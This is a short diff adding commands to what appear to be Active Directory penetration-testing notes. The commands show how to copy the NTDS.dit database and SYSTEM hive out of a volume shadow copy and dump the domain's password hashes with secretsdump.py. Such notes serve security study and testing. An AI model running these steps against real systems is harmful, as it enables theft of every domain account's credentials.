@@ -74,6 +74,12 @@ It is the database of Active Directory.
 It is located under %SystemRoot%\Windows\NTDS
 Favorite file of any attacker.
 It can be copied through Shadow copy
+  vssadmin create shadow /for=C:
+  vssadmin list shadows
+  copy <shadow>\Windows\ntds\ntds.dit ./ntds.dit
+  copy <shadow>\Windows\system32\config\system ./system
+  vssadmin delete shadow /for=C:
+  secretsdump.py -ntds <ntds.dit> -system <SYSTEM_Name> -hashes lmhash:nthash LOCAL -outputfile <filename>
 
 
 
